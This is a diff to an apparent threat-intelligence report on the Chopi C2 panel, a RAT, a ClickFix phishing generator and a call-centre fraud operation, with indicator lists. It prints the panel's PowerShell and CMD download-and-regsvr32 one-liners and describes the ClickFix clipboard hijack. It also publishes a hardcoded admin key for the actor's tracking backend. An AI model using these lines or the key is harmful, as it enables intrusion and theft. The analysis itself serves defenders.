@@ -168,6 +168,76 @@ Character indexing into the string builds `iwr` (Invoke-WebRequest). The payload
 
 ---
 
+### Inside the Chopi panel: a feature inventory from the source
+
+I managed to pull the panel's compiled JavaScript bundle (`index-Cm3zVjk-.js`, 322,350 bytes, sha256 `9d6ead50b7674cdd49e87a22214241a1bd4144954d2fab51aaf4a955526d6a6e`, build date 2026-06-22). All five Chopi nodes carry the same bundle, byte-for-byte. What follows is drawn entirely from static analysis of that single file.
+
+The panel calls itself an **"Employee Monitoring Dashboard"** in its login subtitle — presumably the cover story if someone stumbles across the login page. Under that framing sits a full-featured C2 suite.
+
+**REST API surface (30+ endpoints)**
+
+```
+/api/auth/status      /api/login            /api/logout
+/api/audit            /api/logs
+/api/build            /api/build/defaults   ← OCX agent compiler
+/api/chrome/list      /api/chrome/save      /api/chrome/data/{id}
+/api/ntlm/list        /api/ntlm/save        /api/ntlm/data/{id}
+/api/socks/list       /api/socks/start/{id} /api/socks/stop/{id}
+/api/agents/{id}/toggle-hidden
+/api/browser/{back|forward|click|key|navigate|refresh|scroll|start|stop|type}
+/api/deploy-phish     ← integrated phishing deployer
+/api/files            /api/upload
+/api/links            /api/visits           ← phishing link tracker (X-Admin-Key header)
+/api/server/start     /api/server/stop      /api/server/schedule
+/api/webdav/status    /api/webdav/{start|stop}
+```
+
+**Per-agent capabilities (from UI source strings)**
+
+The operator dashboard presents a per-agent control surface with the following capabilities, quoted directly from the bundle:
+
+- **Shell** — interactive CMD session
+- **Screen capture** — configurable FPS (5/10/15/20/30) and quality (30/50/70/90)
+- **Audio/clipboard/keylog** — real-time audio, clipboard surveillance, keystroke capture
+- **File manager** — browse, download, upload, delete
+- **Process list** — list and kill by PID
+- **Chrome extraction** — *"Extracts passwords, cookies, cards, and tokens from all Chromium browsers on this machine."* Data categories: `["passwords","cookies","cards","tokens","ibans","history"]`. IBANs and payment cards are explicit targets.
+- **Chrome launch** — *"Launches the user's real Chrome with their full profile — all saved logins, cookies, sessions, and extensions. Chrome will briefly restart on the agent's machine."* This maps to `chromelevator.ocx`, which kills Chrome, relaunches it with `--remote-debugging-port`, and exfiltrates via the DevTools Protocol.
+- **NTLM/WPAD hash capture** — *"Registers WPAD via ADIDNS and starts an HTTP server that captures NTLMv2 hashes."* Maps to `wpad_capture.ocx`. No admin rights needed; ADIDNS write access (default for domain users) is sufficient. All captured hashes persist server-side across restarts.
+- **Token theft** — steal process tokens for privilege escalation (`token_run`)
+- **Credential exec** — `cred_exec` / `cred_logon` for pass-the-credential lateral movement
+- **Auth Exec (SMB scheduled task)** — *"Connects to target via SMB with credentials, creates a scheduled task to run the command, captures output, and cleans up. Requires admin rights + ports 445 and 135 on target."*
+- **Network recon** — ARP scan, port scan, SMB share enumeration. Default port-scan preset: `10,135,139,143,389,443,445,993,995,1433,3306,3389,5900,5985,8080,8443` — Windows/AD/database/RDP/management ports.
+- **Active Directory** — `domain_users`, `domain_groups`, `domain_group_members`, `domain_computers`, `domain_sessions`, `domain_trusts`
+- **HTTP proxy / SOCKS5** — route requests through the agent's network context
+- **Remote browser control** — full browser automation (navigate, click, type, scroll, screenshot frames)
+
+**Agent builder**
+
+`/api/build` compiles a new OCX on demand. The UI surfaces three delivery options for each build:
+
+```
+1. Direct download link:    http://<host>:<port>/files/<filename>
+2. PowerShell one-liner:    powershell -w hidden -c "iwr http://<host>/files/<f.ocx>
+                              -OutFile $env:TEMP\<f.ocx>; regsvr32 /s /i $env:TEMP\<f.ocx>"
+3. CMD one-liner:           curl -o %TEMP%\<f.ocx> http://<host>/files/<f.ocx>
+                              && regsvr32 /s /i %TEMP%\<f.ocx>
+```
+
+The default filename in the builder UI is `mscomctl.ocx` — the same name carried by the agents on the staging server.
+
+**ClickFix phishing generator**
+
+`/api/deploy-phish` backs a built-in ClickFix generator with two Cloudflare impersonation templates — "Cloudflare Turnstile" (green checkmark, light background) and "Cloudflare Classic" (orange card). The flow: fake Turnstile checkbox → 2.5-second "Verifying…" delay → clipboard hijack via `document.execCommand('copy')` + `navigator.clipboard.writeText()` with the regsvr32 payload → "Action required" prompt → on `visibilitychange` (user has tabbed to Run dialog and pasted) → "Verified" confirmation screen. Payload is base64-encoded client-side; the default phishing domain is `secure-access.org` (registered May 2024, Gandi SAS — the oldest confirmed actor asset).
+
+A **"Deploy to screenly.cam"** button appears in the builder, pointing to a separate tracking backend discussed in the next section.
+
+**WebSocket vocabulary (60+ message types)**
+
+The full operator-to-agent command surface runs over WebSocket. Partial listing of non-obvious types: `wpad_start/stop/hashes`, `token_run`, `remote_logon`, `monitor_list`, `browser_frame/status`, `chrome_extract/upload`, `domain_group_members/computers`, `proxy_request/response/error`, `new_audit`, `server_status`, `module_loaded`.
+
+---
+
 ### trackgrid.net: the backbone domain
 
 `65.20.108.18` also resolves to `thessa.trackgrid.net`. That subdomain hosts both `/ws/agent` (the WebSocket C2 endpoint) and `/auth/login.php` (the Chopi panel login). The registrar for `trackgrid.net` is Namecheap, with a withheldforprivacy.com shield and a Reykjavik, Iceland admin address.
@@ -199,12 +269,32 @@ The Contabo node (`mtdscrm.online`, `84.247.149.210`, Singapore) has a second CR
 
 `mtdscrm.online` was registered on 2025-04-27 through Namecheap, with a withheldforprivacy.com privacy shield and a Reykjavik, Iceland admin address. Same registrar, same privacy service, same location as `trackgrid.net`. These two domains share a registrant fingerprint.
 
+The CRM's `/uploads/` directory was an open listing. It held 13 CSV import batches. A single batch contained 32,122 rows; across all 13 batches, the exposure runs to roughly 200,000 leads. The data schema stretches to 87 columns — PII, financials, and session-tracking fields:
+
+```
+email / firstname / lastname / phone / ip
+deposit_amount / ftd_found_date / revenue / payout
+brand / campaign / traffic_source / affiliate / sub_source
+call_status / status / falcon_status
+autologin_ip / autologin_user_agent
+userAgent / device / browser
+```
+
+`autologin_ip` and `autologin_user_agent` imply the CRM can issue pre-authenticated session links for direct account takeover — the operator places the call, the victim clicks a link, and their account is already logged in.
+
+Campaign names in the data: **Traffic Bank CPA**, **NX CPA**, **Crazy Ads CPA**, **Punch CRG**, **Fads CRG**. CPA (cost-per-acquisition) naming means someone is paying per successful fraud conversion. This is affiliate-model financial fraud running on top of the RAT.
+
+Geographic spread across the CSV batches: GB, FR, CZ, PT, DE, CA, IT, US, AU, NZ, MX, CL, GT, PE, TR, IL — targeting is not regional; it's global.
+
+The CRM backend PHP API exposes its own directory listing. Ten endpoints: `add_callback.php`, `add_comment.php`, `add_deposit.php`, `add_deposit.php`, `admin_import.php`, `click2call.php`, `delete_deposit.php`, `lead_preview.php`, `save_call_outcome.php`, `set_dial_prefix.php`, `update_lead_status.php`. The full call-centre workflow — dialling, outcome logging, deposit recording, click-to-call — is exposed without authentication gate on the directory itself.
+
 The actor's workflow, as best I can reconstruct it:
 
 1. Operators log into the CRM and pull a lead.
 2. They call the target, presenting as SwiftDrop or a similar cover.
 3. The target is social-engineered into clicking a `.url` lure or opening a `.lnk` file.
-4. The ixwebsocket RAT installs itself, establishes a WebSocket C2 session, and the operator switches from the phone call to the dashboard.
+4. The ixwebsocket RAT installs itself, establishes a WebSocket C2 session, and the operator switches from the phone call to the Chopi dashboard.
+5. Chrome credentials, saved payment cards, and IBANs are extracted. The deposit field in the CRM gets updated.
 
 ---
 
@@ -227,6 +317,26 @@ Searching Shodan for `http.title:"SwiftDrop Deliveries"` returned three instance
 | `206.81.25.27` | DigitalOcean DE | `simulationevaluator.org` |
 
 The DigitalOcean nodes take the campaign beyond the Vultr cluster. `blockresolver.com` was registered 2026-02-04; `simulationevaluator.org` on 2026-02-12, through NameSilo, with QHoster nameservers. Neither domain has prior VT coverage. These are clean infrastructure nodes, stood up specifically for the lure.
+
+---
+
+### screenly.cam, a hardcoded admin key, and the teardown
+
+The panel bundle contains five fetch calls to `https://screenly.cam`, all with the header `X-Admin-Key: ch0p1-adm1n`. The endpoints: `GET /api/links` (list tracking links), `POST /api/links` (create), `DELETE /api/links/{id}`, `GET /api/visits` (all victim clicks), `GET /api/visits/{id}` (per-link detail). `screenly.cam` is the actor's phishing-click tracking backend, named after its purpose — screen + camera, i.e. remote screen capture. The key `ch0p1-adm1n` is hardcoded in the public-facing bundle, meaning anyone who pulls the JS can query the tracking database if the domain comes back online.
+
+The registrar for `screenly.cam` is Namecheap. Its nameservers are `dns1.registrar-servers.com` and `dns2.registrar-servers.com` — identical to `trackgrid.net`. Same Namecheap account, same name server delegation: conclusive operational link between the two domains.
+
+`screenly.cam` was registered 2026-04-01. It was put on `server hold` + `client hold` (registry-level freeze) on **2026-06-22** — the same day the Chopi panel bundle was compiled. Something happened that day that prompted the actor to freeze their tracking backend and bake a new panel build. By 2026-06-30 the certificate had expired and the domain was unreachable.
+
+**The teardown in real time**
+
+The investigation took place on 2026-06-30. As recon progressed across the trackgrid.net subdomains, the infrastructure started going dark:
+
+- **~15:20 UTC** — `crm.trackgrid.net`, `thessa.trackgrid.net`, `trackgrid.net` apex, and `www.trackgrid.net` all had their authoritative A records pulled within a 15-minute window. Public DNS returned SERVFAIL (resolver caches still held stale answers briefly); authoritative was already empty.
+- **~15:35 UTC** — `65.20.97.79` (the `wavetracker.io` / `api.trackgrid.net` front-door, serving the actor's brand homepage) was reclaimed by Vultr. The same IP now serves a Google `*.google-analytics.com` certificate and a 404. The homepage content is gone — it was never archived by Wayback Machine.
+- **~15:39 UTC** — `lg.txt` (the debug log that leaked DESKTOP-ET51AJO / Bruno / 172.16.1.2) returned HTTP 404 from the staging server. The one artefact that names a specific operator workstation was cleaned up during the session.
+
+The actor pulled six DNS records and deleted the debug log in under 20 minutes while recon was active. `threadedarbiter.net` survived (different registrar, harder to touch quickly). The timeline suggests some form of infrastructure monitoring — either automated alerting on unusual DNS query volume or a human watching access logs on the staging server.
 
 ---
 
@@ -285,11 +395,15 @@ Sixteen IPs across three providers (Vultr primary, DigitalOcean secondary, Conta
 
 ### Attribution notes
 
-I'm not going to put a flag on this. The Malaysia overlap (sample origin, `ceinbase.com` WHOIS) is consistent but not conclusive — Kuala Lumpur privacy-service addresses are common in the region's threat ecosystem, and VT submitter location tells you where the sample was seen, not necessarily where the operator sits.
+I'm not going to put a flag on this. The Malaysia overlap (sample origin, `ceinbase.com` WHOIS) is real but not conclusive — Kuala Lumpur privacy-service addresses are common in the regional threat ecosystem, and VT submitter location tells you where the sample was seen, not necessarily where the operator sits.
 
-What I can say: this is a financially motivated actor running a hybrid operation — not just a RAT campaign and not just phishing. The Call Center CRM is the tell. The volume of SSH-only bench nodes on `trackgrid.net` suggests the infrastructure is larger than what Shodan has indexed. The Coinbase phishing predates the RAT campaign by at least a year (`ceinbase.com`, Feb 2024), which means this group has been operating since at least early 2024 and has evolved over that period.
+What the `ceinbase.com` CT certificate history does establish is that this operation is older than the RAT campaign suggests. The domain's first certificate was issued in **April 2018** — not 2024. Fifty-two distinct subdomains across 155 certificates ran from 2018 through early 2025. Among those subdomains: `painel` (Portuguese for "panel"), `akunting` and `absensi` (Indonesian for "accounting" and "attendance"). Indonesian and Lusophone language markers in the admin interface naming point toward a Southeast Asian or Lusophone operator, or a team spanning both. That's consistent with a Malaysia-primary operation with Portuguese-speaking affiliates (Brazil, Portugal) handling some administration.
 
-The Chopi C2 framework, the consistent Vultr preference, and the Namecheap/Reykjavik registration pattern are the strongest clustering signals. If you have samples that reach `trackgrid.net` or the Chopi panel fingerprint (`http.title:"Chopi — Monitoring Dashboard"`, ETag `W/"241-19eef4cae15"`), they likely belong to this cluster.
+The `wavetracker.io` brand domain (registered 2025-12-10) predates `trackgrid.net` (2025-12-23) by 13 days. The operator built the public-facing brand name first and the backend second — a product-development mindset, not a throwaway campaign. `secure-access.org`, the ClickFix default phishing domain, was registered in May 2024 through Gandi SAS (France) — the oldest currently-active asset in the infrastructure and the fifth distinct registrar in the actor's stack (Namecheap, OwnRegistrar, GMO/Onamae, WEBCC, Gandi). That deliberate registrar diversification is an operational choice to complicate simultaneous takedown across jurisdictions.
+
+The teardown behaviour observed during this investigation — DNS records pulled in real time, debug log deleted within minutes of recon activity — suggests the actor is running active monitoring on their infrastructure, not just passive. A group that has been operating since 2018, manages 1,000+ fraud domains across multiple affiliate campaigns, and built a custom C2 framework with an integrated ClickFix generator and OCX agent compiler does not stumble into operational security. The debug log leak and the anonymous-write WebDAV were mistakes. The teardown response was not.
+
+The Chopi C2 framework, the consistent Vultr preference, and the Namecheap/Reykjavik registration pattern are the strongest clustering signals. If you have samples that reach `trackgrid.net`, `screenly.cam`, or carry the Chopi panel fingerprint (`http.title:"Chopi — Monitoring Dashboard"`, ETag `W/"241-19eef4cae15"`), they likely belong to this cluster.
 
 ---
 
@@ -323,13 +437,16 @@ trackgrid.net            backbone (Namecheap, Reykjavik, 2025-12-23)
 thessa.trackgrid.net     ws C2 + Chopi panel
 crm.trackgrid.net        Call Center CRM-1
 mtdscrm.online           Call Center CRM-2 (Namecheap, Reykjavik, 2025-04-27)
+wavetracker.io           brand domain / front-door (Namecheap/Iceland, 2025-12-10) → 65.20.97.79
+screenly.cam             click-tracking backend (Namecheap, 2026-04-01; frozen 2026-06-22)
 rginginternet.com        mail server alias
 
 # Domains — lure / phishing
 threadedarbiter.net      SwiftDrop lure
 blockresolver.com        SwiftDrop lure (2026-02-04)
 simulationevaluator.org  SwiftDrop lure (2026-02-12)
-ceinbase.com             Coinbase phishing (KL Malaysia, 2024-02-14)
+secure-access.org        ClickFix phishing default (Gandi SAS, 2024-05-21; oldest active asset)
+ceinbase.com             Coinbase phishing (KL Malaysia, 2024-02-14; CT history to 2018-04)
 coinbrase.com            Coinbase phishing
 coinblase.com            Coinbase phishing
 loading-coinbase.com     Coinbase phishing
@@ -355,6 +472,13 @@ hostname: DESKTOP-ET51AJO   user: Bruno   LAN: 172.16.1.2
 # Chopi panel fingerprint (Shodan)
 http.title:"Chopi — Monitoring Dashboard"
 ETag: W/"241-19eef4cae15"
+
+# Panel bundle (all 5 nodes carry identical build)
+index-Cm3zVjk-.js   sha256 9d6ead50b7674cdd49e87a22214241a1bd4144954d2fab51aaf4a955526d6a6e
+                    build date: 2026-06-22 / 322,350 bytes
+
+# Hardcoded credential in panel bundle
+X-Admin-Key: ch0p1-adm1n  (screenly.cam admin API, 5 call sites in bundle)
 
 # Shared RAT config
 WS path: /ws/agent   UA: Mozilla/5.0
@@ -536,9 +660,11 @@ The AES S-box anchor (`63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76`) is the 
 ```
 # Additional IPs — Vultr AS20473
 65.20.99.75      previous IP of mad12vm1.rgingenieros.com (= 208.85.22.144, same SSH key)
-65.20.97.79      api.trackgrid.net / integrox.io / wavetracker.io
+65.20.97.79      api.trackgrid.net / wavetracker.io brand front-door (box reclaimed 2026-06-30)
 208.85.21.245    cellexpert.io staging (AI Call Platform + PHP API backend)
+208.85.22.145    transient CRM host (2025-12-31; migrated to 65.20.101.220 Jan 2026)
 140.82.16.230    Windows 11 staging VM (RDP:3389 + WinRM:5985 exposed, WsgiDAV on :443)
+70.34.205.43     agent builder placeholder IP (dead; Vultr 70.34.192.0/19, different range)
 45.76.93.68      rgingenieros.com primary (Vesta CP, Frankfurt DE)
 45.76.87.178     frk10vm1.rgingenieros.com / frk10vm1.rginternet.com (Frankfurt mail)
 
